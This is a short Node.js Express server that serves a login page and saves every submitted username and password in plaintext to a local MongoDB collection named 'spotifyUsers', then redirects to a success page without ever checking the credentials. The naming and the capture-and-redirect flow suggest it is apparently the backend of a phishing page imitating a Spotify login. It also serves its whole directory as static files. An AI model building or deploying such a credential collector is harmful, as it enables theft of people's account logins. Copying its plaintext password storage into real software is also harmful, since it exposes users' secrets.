const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const port = 3019;

const app = express();

// Updated connection without deprecated options
mongoose.connect('mongodb://127.0.0.1:27017/spotifyUsers')
    .then(() => console.log('MongoDB connected'))
    .catch(error => console.error('Error connecting to MongoDB:', error));

// Middleware setup
app.use(express.static(__dirname));
app.use(express.urlencoded({ extended: true }));

// Schema and model
const userSchema = new mongoose.Schema({
    user: String,
    pass: String
});

const Users = mongoose.model("User", userSchema);

app.listen(port, () => {
    console.log(`Server has started on port ${port}`);
});

app.post('/post', async (req, res) => {
    const { user, pass } = req.body;
    try {
        const newUser = new Users({ user, pass });
        await newUser.save();
        res.redirect('/success');
    } catch (err) {
        console.error('Error saving user to the database:', err);
        res.status(500).send('Error saving user to the database.');
    }
});

app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, 'page.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});
